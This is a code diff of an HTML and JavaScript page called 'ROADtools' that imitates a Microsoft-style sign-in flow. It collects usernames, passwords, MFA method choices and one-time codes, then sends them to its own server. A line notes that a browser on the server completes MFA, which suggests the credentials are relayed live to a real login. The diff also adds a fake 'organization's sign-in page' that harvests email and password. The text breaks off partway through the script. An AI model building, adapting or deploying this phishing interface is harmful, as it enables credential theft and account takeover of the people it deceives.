@@ -1,730 +1,996 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <title>ROADtools</title>
-  <style>
-    * {
-      box-sizing: border-box;
-    }
+<meta charset="UTF-8">
+<title>ROADtools</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    background: #f2f2f2;
+    color: #1b1b1b;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    margin: 0;
+    padding-bottom: 60px;
+  }
+  .wrapper {
+    width: 460px;
+    max-width: calc(100vw - 40px);
+  }
+  .brand {
+    text-align: center;
+    margin-bottom: 24px;
+    font-size: 30px;
+    font-weight: 600;
+    color: #2b5fd9;
+    letter-spacing: -0.5px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 4px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    padding: 40px 48px;
+  }
+  .logo-mark {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 22px;
+  }
+  .logo-mark .dot {
+    width: 22px;
+    height: 22px;
+    border-radius: 4px;
+    background: #2b5fd9;
+  }
+  .logo-mark span {
+    font-size: 17px;
+    font-weight: 600;
+    color: #444;
+  }
+  h1 {
+    font-size: 26px;
+    margin: 0 0 22px;
+    color: #1b1b1b;
+  }
+  label {
+    display: block;
+    font-size: 13px;
+    color: #555;
+    margin-bottom: 6px;
+  }
+  input {
+    width: 100%;
+    padding: 10px 0;
+    border: none;
+    border-bottom: 1px solid #bbb;
+    background: transparent;
+    color: #1b1b1b;
+    font-size: 15px;
+    margin-bottom: 4px;
+  }
+  input::placeholder { color: #888; }
+  input:focus {
+    outline: none;
+    border-bottom: 2px solid #2b5fd9;
+  }
+  .field { margin-bottom: 22px; }
+  .links {
+    font-size: 13px;
+    margin-bottom: 22px;
+  }
+  .links a {
+    color: #2b5fd9;
+    text-decoration: none;
+  }
+  .links a:hover { text-decoration: underline; }
+  .links div { margin-bottom: 8px; }
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+  }
+  button {
+    padding: 10px 24px;
+    min-width: 90px;
+    border: none;
+    border-radius: 2px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+  }
+  button.primary {
+    background: #2b5fd9;
+    color: #fff;
+  }
+  button.primary:hover:not(:disabled) { background: #234db3; }
+  button.primary:disabled { background: #a9bde8; cursor: not-allowed; }
+  button.secondary {
+    background: #e6e6e6;
+    color: #1b1b1b;
+  }
+  button.secondary:hover { background: #d8d8d8; }
 
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: #f2f2f2;
-      color: #1b1b1b;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      margin: 0;
-      padding-bottom: 60px;
-    }
+  #status {
+    margin-top: 18px;
+    font-size: 13px;
+    line-height: 1.5;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+  .status-info    { color: #666; }
+  .status-success { color: #1a7f37; }
+  .status-error   { color: #c4302b; }
 
-    .wrapper {
-      width: 460px;
-      max-width: calc(100vw - 40px);
-    }
+  .options-card {
+    background: #ffffff;
+    border-radius: 4px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    padding: 18px 24px;
+    margin-top: 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 14px;
+    color: #333;
+  }
 
-    .brand {
-      text-align: center;
-      margin-bottom: 24px;
-      font-size: 30px;
-      font-weight: 600;
-      color: #2b5fd9;
-      letter-spacing: -0.5px;
-    }
+  pre {
+    background: #f7f7f7;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    padding: 10px;
+    font-size: 12px;
+    overflow-x: auto;
+    max-height: 220px;
+    margin-top: 12px;
+  }
 
-    .card {
-      background: #ffffff;
-      border-radius: 4px;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
-      padding: 40px 48px;
-    }
+  .footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    z-index: 600;
+    background: #4d4d4d;
+    color: #f2f2f2;
+    font-size: 13px;
+    padding: 14px 24px;
+    display: flex;
+    justify-content: flex-end;
+    gap: 28px;
+  }
+  .footer a {
+    color: #f2f2f2;
+    text-decoration: none;
+  }
+  .footer a:hover { text-decoration: underline; }  .options-card svg {
+    flex-shrink: 0;
+    color: #444;
+  }  .mfa-option-btn {
+    display: block;
+    width: 100%;
+    text-align: left;
+    padding: 14px 16px;
+    margin-bottom: 8px;
+    background: #fafafa;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    font-size: 14px;
+    color: #1b1b1b;
+    cursor: pointer;
+  }
+  .mfa-option-btn:hover { background: #eef2fc; border-color: #2b5fd9; }
+  .mfa-option-btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
-    h1 {
-      font-size: 26px;
-      margin: 0 0 22px;
-      color: #1b1b1b;
-    }
+  .mfa-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 22px;
+    font-size: 15px;
+    color: #1b1b1b;
+  }
+  .mfa-header .back-arrow {
+    cursor: pointer;
+    color: #444;
+    font-size: 18px;
+    line-height: 1;
+  }
+  .mfa-divider {
+    border: none;
+    border-top: 1px dashed #ccc;
+    margin: 0;
+  }
+  .mfa-option-btn {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    width: 100%;
+    text-align: left;
+    padding: 16px 4px;
+    background: transparent;
+    border: none;
+    border-bottom: 1px dashed #ccc;
+    font-size: 15px;
+    color: #1b1b1b;
+    cursor: pointer;
+    min-width: 0;
+  }
+  .mfa-option-btn:last-child { border-bottom: none; }
+  .mfa-option-btn:hover { background: #f5f7fd; }
+  .mfa-option-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .mfa-option-btn .icon-box {
+    flex-shrink: 0;
+    width: 36px;
+    height: 36px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #444;
+  }
+  .mfa-option-btn .icon-123 {
+    width: 34px;
+    height: 26px;
+    border: 2px solid #444;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 700;
+    color: #444;
+  }
+  .mfa-cancel-row {
+    display: flex;
+    justify-content: flex-end;
+    margin-top: 20px;
+  }
+  .code-context {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    margin-bottom: 26px;
+    font-size: 15px;
+    color: #333;
+  }
+  .code-context svg { flex-shrink: 0; margin-top: 2px; color: #444; }
+  .dots-loader {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+  .dots-loader .dot {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #2b5fd9;
+    animation: dot-bounce 1.2s ease-in-out infinite;
+  }
+  .dots-loader .dot:nth-child(1) { animation-delay: 0s; }
+  .dots-loader .dot:nth-child(2) { animation-delay: 0.15s; }
+  .dots-loader .dot:nth-child(3) { animation-delay: 0.3s; }
+  @keyframes dot-bounce {
+    0%, 60%, 100% { transform: translateY(0); opacity: 0.5; }
+    30% { transform: translateY(-6px); opacity: 1; }
+  }
 
-    label {
-      display: block;
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 6px;
-    }
+  .spinner {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border: 2px solid #ccc;
+    border-top-color: #2b5fd9;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  #orgLoginPage {
+    position: fixed;
+    inset: 0;
+    background: #ffffff;
+    z-index: 500;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+  }
+  .org-topbar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 20px 40px;
+    border-bottom: 1px solid #eee;
+  }
+  .org-topbar-brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    cursor: pointer;
+  }
+  .org-topbar .dot, .org-panel-brand .dot {
+    width: 30px;
+    height: 30px;
+    border-radius: 6px;
+    background: #2b5fd9;
+  }
+  .org-topbar span { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
 
-    input {
-      width: 100%;
-      padding: 10px 0;
-      border: none;
-      border-bottom: 1px solid #bbb;
-      background: transparent;
-      color: #1b1b1b;
-      font-size: 15px;
-      margin-bottom: 4px;
-    }
+  .org-body {
+    flex: 1;
+    background: #f4f5f7;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 100px;
+    padding: 60px 40px 100px;
+    flex-wrap: wrap;
+  }
+  .org-left-placeholder {
+    width: 460px;
+    height: 400px;
+    flex-shrink: 0;
+  }
+  .org-panel {
+    background: #fff;
+    border-radius: 6px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+    padding: 56px 64px;
+    width: 620px;
+  }
+  .org-panel-brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 34px;
+  }
+  .org-panel-brand span { font-size: 26px; font-weight: 700; }
+  #orgLoginPage h1 { font-size: 34px; margin: 0 0 12px; }
+  .org-domain-note { color: #666; font-size: 15px; margin-bottom: 28px; line-height: 1.5; }
 
-    input::placeholder {
-      color: #888;
-    }
+  .org-field { margin-bottom: 26px; }
+  .org-field label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
+  .org-field label .req { color: #c4302b; }
+  .org-field-row { display: flex; justify-content: space-between; align-items: center; }
+  .org-field-row a { font-size: 13px; color: #2b5fd9; text-decoration: none; }
+  .org-field-row a:hover { text-decoration: underline; }
+  #orgLoginPage input {
+    width: 100%;
+    padding: 16px 16px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 17px;
+    margin-top: 6px;
+  }
+  #orgLoginPage input:focus { outline: none; border-color: #2b5fd9; }
 
-    input:focus {
-      outline: none;
-      border-bottom: 2px solid #2b5fd9;
-    }
+  .org-checkbox-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 15px;
+    margin: 22px 0 28px;
+  }
+  .org-checkbox-row input { width: auto; margin: 0; accent-color: #2b5fd9; transform: scale(1.1); }
 
-    .field {
-      margin-bottom: 22px;
-    }
+  .org-primary-btn {
+    width: 100%;
+    padding: 20px;
+    background: #1b1b1b;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+  }
+  .org-primary-btn:hover:not(:disabled) { background: #333; }
+  .org-primary-btn:disabled { background: #999; cursor: not-allowed; }
 
-    .links {
-      font-size: 13px;
-      margin-bottom: 22px;
-    }
+  .org-help-link { font-size: 16px; margin-top: 24px; }
+  .org-help-link a { color: #1b1b1b; text-decoration: underline; }
 
-    .links a {
-      color: #2b5fd9;
-      text-decoration: none;
-    }
+  .org-redirecting {
+    background: #fff;
+    border-radius: 6px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+    padding: 56px 64px;
+    width: 620px;
+    min-height: 340px;
+  }
+  .org-redirecting h1 { font-size: 30px; margin: 0 0 60px; line-height: 1.3; }
+  .org-redirecting .single-dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: #2b5fd9;
+    margin: 0 auto 60px;
+    animation: single-dot-pulse 1s ease-in-out infinite;
+  }
+  @keyframes single-dot-pulse {
+    0%, 100% { opacity: 0.3; transform: scale(0.9); }
+    50% { opacity: 1; transform: scale(1.15); }
+  }
+  .org-cancel-link {
+    color: #2b5fd9;
+    text-decoration: none;
+    border-bottom: 1px dashed #2b5fd9;
+    font-size: 16px;
+    background: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    cursor: pointer;
+    padding: 0 0 2px;
+  }
+  .org-cancel-link:hover { color: #234db3; border-bottom-color: #234db3; }
 
-    .links a:hover {
-      text-decoration: underline;
-    }
-
-    .links div {
-      margin-bottom: 8px;
-    }
-
-    .actions {
-      display: flex;
-      justify-content: flex-end;
-      gap: 10px;
-    }
-
-    button {
-      padding: 10px 24px;
-      min-width: 90px;
-      border: none;
-      border-radius: 2px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-
-    button.primary {
-      background: #2b5fd9;
-      color: #fff;
-    }
-
-    button.primary:hover:not(:disabled) {
-      background: #234db3;
-    }
-
-    button.primary:disabled {
-      background: #a9bde8;
-      cursor: not-allowed;
-    }
-
-    button.secondary {
-      background: #e6e6e6;
-      color: #1b1b1b;
-    }
-
-    button.secondary:hover {
-      background: #d8d8d8;
-    }
-
-    #status {
-      margin-top: 18px;
-      font-size: 13px;
-      line-height: 1.5;
-      white-space: pre-wrap;
-      word-break: break-word;
-    }
-
-    .status-info {
-      color: #666;
-    }
-
-    .status-success {
-      color: #1a7f37;
-    }
-
-    .status-error {
-      color: #c4302b;
-    }
-
-    .options-card {
-      background: #ffffff;
-      border-radius: 4px;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
-      padding: 18px 24px;
-      margin-top: 16px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      font-size: 14px;
-      color: #333;
-    }
-
-    pre {
-      background: #f7f7f7;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      padding: 10px;
-      font-size: 12px;
-      overflow-x: auto;
-      max-height: 220px;
-      margin-top: 12px;
-    }
-
-    .footer {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: #4d4d4d;
-      color: #f2f2f2;
-      font-size: 13px;
-      padding: 14px 24px;
-      display: flex;
-      justify-content: flex-end;
-      gap: 28px;
-    }
-
-    .footer a {
-      color: #f2f2f2;
-      text-decoration: none;
-    }
-
-    .footer a:hover {
-      text-decoration: underline;
-    }
-
-    .options-card svg {
-      flex-shrink: 0;
-      color: #444;
-    }
-
-    .mfa-option-btn {
-      display: block;
-      width: 100%;
-      text-align: left;
-      padding: 14px 16px;
-      margin-bottom: 8px;
-      background: #fafafa;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      font-size: 14px;
-      color: #1b1b1b;
-      cursor: pointer;
-    }
-
-    .mfa-option-btn:hover {
-      background: #eef2fc;
-      border-color: #2b5fd9;
-    }
-
-    .mfa-option-btn:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
-
-    .mfa-header {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 22px;
-      font-size: 15px;
-      color: #1b1b1b;
-    }
-
-    .mfa-header .back-arrow {
-      cursor: pointer;
-      color: #444;
-      font-size: 18px;
-      line-height: 1;
-    }
-
-    .mfa-divider {
-      border: none;
-      border-top: 1px dashed #ccc;
-      margin: 0;
-    }
-
-    .mfa-option-btn {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      width: 100%;
-      text-align: left;
-      padding: 16px 4px;
-      background: transparent;
-      border: none;
-      border-bottom: 1px dashed #ccc;
-      font-size: 15px;
-      color: #1b1b1b;
-      cursor: pointer;
-      min-width: 0;
-    }
-
-    .mfa-option-btn:last-child {
-      border-bottom: none;
-    }
-
-    .mfa-option-btn:hover {
-      background: #f5f7fd;
-    }
-
-    .mfa-option-btn:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
-
-    .mfa-option-btn .icon-box {
-      flex-shrink: 0;
-      width: 36px;
-      height: 36px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #444;
-    }
-
-    .mfa-option-btn .icon-123 {
-      width: 34px;
-      height: 26px;
-      border: 2px solid #444;
-      border-radius: 3px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 13px;
-      font-weight: 700;
-      color: #444;
-    }
-
-    .mfa-cancel-row {
-      display: flex;
-      justify-content: flex-end;
-      margin-top: 20px;
-    }
-
-    .code-context {
-      display: flex;
-      align-items: flex-start;
-      gap: 12px;
-      margin-bottom: 26px;
-      font-size: 15px;
-      color: #333;
-    }
-
-    .code-context svg {
-      flex-shrink: 0;
-      margin-top: 2px;
-      color: #444;
-    }
-
-    .spinner {
-      display: inline-block;
-      width: 14px;
-      height: 14px;
-      border: 2px solid #ccc;
-      border-top-color: #2b5fd9;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin-right: 8px;
-      vertical-align: middle;
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-  </style>
+  .org-below-panel { text-align: center; margin-top: 28px; }
+  .org-below-prompt { font-weight: 700; font-size: 17px; margin-bottom: 16px; }
+  .org-get-started-btn {
+    background: #fff;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    padding: 16px 50px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #1b1b1b;
+    cursor: pointer;
+    width: 620px;
+    max-width: 100%;
+  }
+  .org-get-started-btn:hover { background: #f5f5f5; }
+  .org-back-btn {
+    background: #fff;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    padding: 12px 36px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .org-back-btn:hover { background: #f5f5f5; }
+</style>
 </head>
-
 <body>
 
-  <div class="wrapper">
+<div class="wrapper">
+  <div class="brand">ROADtools</div>
 
-    <div class="card">
-      
+  <div class="card">
+    <div class="logo-mark">
+      <div class="dot"></div>
+      <span>ROADtools</span>
+    </div>
 
-      <form id="usernameForm">
-        <h1>Sign in</h1>
-        <div class="field">
-          <input type="text" id="username" placeholder="Email, phone, or Skype" autocomplete="username" required>
-        </div>
-        <div class="links">
-          <div>No account? <a href="#" onclick="return false;">Create one!</a></div>
-          <div><a href="#" onclick="return false;">Can't access your account?</a></div>
-        </div>
-        <div class="actions">
-          <button type="button" class="secondary" id="usernameBackBtn">Back</button>
-          <button type="submit" class="primary" id="usernameBtn">Next</button>
-        </div>
-      </form>
+    <form id="usernameForm">
+      <h1>Sign in</h1>
+      <div class="field">
+        <input type="text" id="username" placeholder="Email, phone, or Skype" autocomplete="username" required>
+      </div>
+      <div class="links">
+        <div>No account? <a href="#" onclick="return false;">Create one!</a></div>
+        <div><a href="#" onclick="return false;">Can't access your account?</a></div>
+      </div>
+      <div class="actions">
+        <button type="button" class="secondary" id="usernameBackBtn">Back</button>
+        <button type="submit" class="primary" id="usernameBtn">Next</button>
+      </div>
+    </form>
 
-      <form id="passwordForm" style="display:none;">
-        <h1>Enter password</h1>
-        <div class="field">
-          <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
-        </div>
-        <div class="links">
-          <div style="color:#666;">A browser window opened on the server — complete MFA there if prompted.</div>
-        </div>
-        <div class="actions">
-          <button type="button" class="secondary" id="backBtn">Back</button>
-          <button type="submit" class="primary" id="passwordBtn">Sign in</button>
-        </div>
-      </form>
+    <form id="passwordForm" style="display:none;">
+      <h1>Enter password</h1>
+      <div class="field">
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+      </div>
+      <div class="links">
+        <div style="color:#666;">A browser window opened on the server — complete MFA there if prompted.</div>
+      </div>
+      <div class="actions">
+        <button type="button" class="secondary" id="backBtn">Back</button>
+        <button type="submit" class="primary" id="passwordBtn">Sign in</button>
+      </div>
+    </form>
 
-      <div id="mfaChoiceScreen" style="display:none;">
-        <div class="logo-mark">
-          <div class="dot"></div>
-          <span>ROADtools</span>
-        </div>
-        <div class="mfa-header" id="mfaChoiceEmailRow"></div>
-        <h1>Verify your identity</h1>
-        <hr class="mfa-divider">
-        <div id="mfaOptionsList"></div>
-        <div class="links" style="margin-top: 14px;">
-          <div style="color:#666;" id="mfaWaitingNote">
-            <span class="spinner"></span>Waiting for you to pick a method...
-          </div>
-        </div>
-        <div class="mfa-cancel-row">
-          <button type="button" class="secondary" id="mfaCancelBtn">Cancel</button>
+    <div id="mfaChoiceScreen" style="display:none;">
+      <div class="logo-mark">
+        <div class="dot"></div>
+        <span>ROADtools</span>
+      </div>
+      <div class="mfa-header" id="mfaChoiceEmailRow"></div>
+      <h1>Verify your identity</h1>
+      <hr class="mfa-divider">
+      <div id="mfaOptionsList"></div>
+      <div class="links" style="margin-top: 14px;">
+        <div style="color:#666;" id="mfaWaitingNote">
+          <span class="dots-loader"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>Waiting for you to pick a method...
         </div>
       </div>
+      <div class="mfa-cancel-row">
+        <button type="button" class="secondary" id="mfaCancelBtn">Cancel</button>
+      </div>
+    </div>
 
-      <form id="mfaCodeForm" style="display:none;">
-        <div class="logo-mark">`
+    <form id="mfaCodeForm" style="display:none;">
+      <div class="logo-mark">
+        <div class="dot"></div>
+        <span>ROADtools</span>
+      </div>
+      <div class="mfa-header" id="mfaCodeEmailRow"></div>
+      <h1>Enter code</h1>
+      <div class="code-context">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+        </svg>
+        <span id="mfaCodeContextText">We texted your phone. Please enter the code to sign in.</span>
+      </div>
+      <div class="field">
+        <input type="text" id="mfaCode" placeholder="Code" inputmode="numeric" autocomplete="one-time-code" required>
+      </div>
+      <div class="actions">
+        <button type="submit" class="primary" id="mfaCodeBtn">Verify</button>
+      </div>
+    </form>
+
+    <div id="status" class="status-info"></div>
+    <pre id="result" style="display:none;"></pre>
+  </div>
+
+  <div class="options-card" id="optionsCard">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="7.5" cy="15.5" r="4.5"></circle>
+      <path d="M10.5 12.5L20 3"></path>
+      <path d="M16 7l3 3"></path>
+      <path d="M13 4l3 3"></path>
+    </svg>
+    <span>Sign-in options</span>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#" onclick="return false;">Terms of use</a>
+  <a href="#" onclick="return false;">Privacy &amp; cookies</a>
+  <a href="#" onclick="return false;">&hellip;</a>
+</div>
+
+<div id="orgLoginPage" style="display:none;">
+  <div class="org-topbar">
+    <div class="org-topbar-brand">
+      <div class="dot"></div>
+      <span>ROADtools</span>
+    </div>
+  </div>
+
+  <div class="org-body">
+    <div class="org-left-placeholder"><!-- drop a ROADtools image/illustration here --></div>
+
+    <div>
+      <div class="org-redirecting" id="orgRedirecting" style="display:none;">
+        <div class="org-panel-brand">
           <div class="dot"></div>
           <span>ROADtools</span>
         </div>
-        <div class="mfa-header" id="mfaCodeEmailRow"></div>
-        <h1>Enter code</h1>
-        <div class="code-context">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
-            stroke-linecap="round" stroke-linejoin="round">
-            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
-          </svg>
-          <span id="mfaCodeContextText">We texted your phone. Please enter the code to sign in.</span>
-        </div>
-        <div class="field">
-          <input type="text" id="mfaCode" placeholder="Code" inputmode="numeric" autocomplete="one-time-code" required>
-        </div>
-        <div class="actions">
-          <button type="submit" class="primary" id="mfaCodeBtn">Verify</button>
-        </div>
-      </form>
+        <h1>Taking you to your organization's sign-in page</h1>
+        <div class="single-dot"></div>
+        <button type="button" class="org-cancel-link" id="orgCancelRedirectBtn">Cancel</button>
+      </div>
 
-      <div id="status" class="status-info"></div>
-      <pre id="result" style="display:none;"></pre>
-    </div>
+      <div class="org-panel" id="orgPanel" style="display:none;">
+        <div class="org-panel-brand">
+          <div class="dot"></div>
+          <span>ROADtools</span>
+        </div>
 
-    <div class="options-card" id="optionsCard">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
-        stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="7.5" cy="15.5" r="4.5"></circle>
-        <path d="M10.5 12.5L20 3"></path>
-        <path d="M16 7l3 3"></path>
-        <path d="M13 4l3 3"></path>
-      </svg>
-      <span>Sign-in options</span>
+        <form id="orgLoginForm">
+          <h1>Sign in</h1>
+          <div class="org-domain-note" id="orgDomainNote">This account uses your organization's sign-in page.</div>
+
+          <div class="org-field">
+            <label for="orgEmail">Email <span class="req">*</span></label>
+            <input type="text" id="orgEmail" placeholder="name@organization.com" autocomplete="username">
+          </div>
+
+          <div class="org-field">
+            <div class="org-field-row">
+              <label for="orgPassword">Password <span class="req">*</span></label>
+              <a href="#" id="orgToggleShow">Show</a>
+            </div>
+            <input type="password" id="orgPassword" autocomplete="current-password" required>
+          </div>
+
+          <div class="org-checkbox-row">
+            <input type="checkbox" id="orgKeepSignedIn" checked>
+            <label for="orgKeepSignedIn">Keep me signed in on this device</label>
+          </div>
+
+          <button type="submit" class="org-primary-btn" id="orgSignInBtn">Sign In</button>
+
+          <div class="org-help-link">Need to find <a href="#">your password</a>?</div>
+          <div id="orgStatus" class="status-info" style="margin-top:14px; font-size:13px; min-height:16px;"></div>
+        </form>
+      </div>
+
+      <div class="org-below-panel">
+        <div class="org-below-prompt">Don't have a ROADtools account?</div>
+        <button type="button" class="org-get-started-btn" id="orgGetStartedBtn">Get Started</button>
+      </div>
     </div>
   </div>
+</div>
 
-  <div class="footer">
-    <a href="#" onclick="return false;">Terms of use</a>
-    <a href="#" onclick="return false;">Privacy &amp; cookies</a>
-    <a href="#" onclick="return false;">&hellip;</a>
-  </div>
+<script>
+const API_BASE = "";
 
-  <script>
-    const API_BASE = "";
+const usernameForm = document.getElementById("usernameForm");
+const passwordForm = document.getElementById("passwordForm");
+const orgLoginForm = document.getElementById("orgLoginForm");
+const orgEmail = document.getElementById("orgEmail");
+const orgPassword = document.getElementById("orgPassword");
+const orgSignInBtn = document.getElementById("orgSignInBtn");
+const orgGetStartedBtn = document.getElementById("orgGetStartedBtn");
+const orgDomainNote = document.getElementById("orgDomainNote");
+const orgRedirecting = document.getElementById("orgRedirecting");
+const orgPanel = document.getElementById("orgPanel");
+const orgCancelRedirectBtn = document.getElementById("orgCancelRedirectBtn");
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const usernameBtn = document.getElementById("usernameBtn");
+const passwordBtn = document.getElementById("passwordBtn");
+const usernameBackBtn = document.getElementById("usernameBackBtn");
+const backBtn = document.getElementById("backBtn");
+const mfaChoiceScreen = document.getElementById("mfaChoiceScreen");
+const mfaOptionsList = document.getElementById("mfaOptionsList");
+const mfaWaitingNote = document.getElementById("mfaWaitingNote");
+const mfaCancelBtn = document.getElementById("mfaCancelBtn");
+const mfaChoiceEmailRow = document.getElementById("mfaChoiceEmailRow");
+const mfaCodeEmailRow = document.getElementById("mfaCodeEmailRow");
+const mfaCodeContextText = document.getElementById("mfaCodeContextText");
+const mfaCodeForm = document.getElementById("mfaCodeForm");
+const mfaCodeInput = document.getElementById("mfaCode");
+const mfaCodeBtn = document.getElementById("mfaCodeBtn");
+const statusEl = document.getElementById("status");
+const resultEl = document.getElementById("result");
+const optionsCard = document.getElementById("optionsCard");
 
-    const usernameForm = document.getElementById("usernameForm");
-    const passwordForm = document.getElementById("passwordForm");
-    const usernameInput = document.getElementById("username");
-    const passwordInput = document.getElementById("password");
-    const usernameBtn = document.getElementById("usernameBtn");
-    const passwordBtn = document.getElementById("passwordBtn");
-    const usernameBackBtn = document.getElementById("usernameBackBtn");
-    const backBtn = document.getElementById("backBtn");
-    const mfaChoiceScreen = document.getElementById("mfaChoiceScreen");
-    const mfaOptionsList = document.getElementById("mfaOptionsList");
-    const mfaWaitingNote = document.getElementById("mfaWaitingNote");
-    const mfaCancelBtn = document.getElementById("mfaCancelBtn");
-    const mfaChoiceEmailRow = document.getElementById("mfaChoiceEmailRow");
-    const mfaCodeEmailRow = document.getElementById("mfaCodeEmailRow");
-    const mfaCodeContextText = document.getElementById("mfaCodeContextText");
-    const mfaCodeForm = document.getElementById("mfaCodeForm");
-    const mfaCodeInput = document.getElementById("mfaCode");
-    const mfaCodeBtn = document.getElementById("mfaCodeBtn");
-    const statusEl = document.getElementById("status");
-    const resultEl = document.getElementById("result");
-    const optionsCard = document.getElementById("optionsCard");
+let currentUsername = null;
+let lastSelectedMfaOption = null;
 
-    let currentUsername = null;
-    let lastSelectedMfaOption = null;
+const DOTS_LOADER_HTML = '<span class="dots-loader"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
 
-    function setStatus(message, kind = "info") {
-      statusEl.textContent = message;
-      statusEl.className = `status-${kind}`;
-    }
+function setStatus(message, kind = "info", loading = false) {
+  statusEl.innerHTML = loading ? DOTS_LOADER_HTML + message : message;
+  statusEl.className = `status-${kind}`;
+}
 
-    function setBusy(button, busy, label) {
-      button.disabled = busy;
-      button.textContent = busy ? "Working..." : label;
-    }
+function setBusy(button, busy, label) {
+  button.disabled = busy;
+  button.textContent = busy ? "Working..." : label;
+}
 
-    async function postJSON(path, body) {
-      const res = await fetch(`${API_BASE}${path}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body),
-      });
-      let data;
+async function postJSON(path, body) {
+  const res = await fetch(`${API_BASE}${path}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+  });
+  let data;
+  try {
+    data = await res.json();
+  } catch {
+    throw new Error(`Server returned non-JSON response (status ${res.status})`);
+  }
+  if (!res.ok || data.ok === false) {
+    throw new Error(data.output || `Request failed (status ${res.status})`);
+  }
+  return data;
+}
+
+async function getJSON(path) {
+  const res = await fetch(`${API_BASE}${path}`);
+  let data;
+  try {
+    data = await res.json();
+  } catch {
+    throw new Error(`Server returned non-JSON response (status ${res.status})`);
+  }
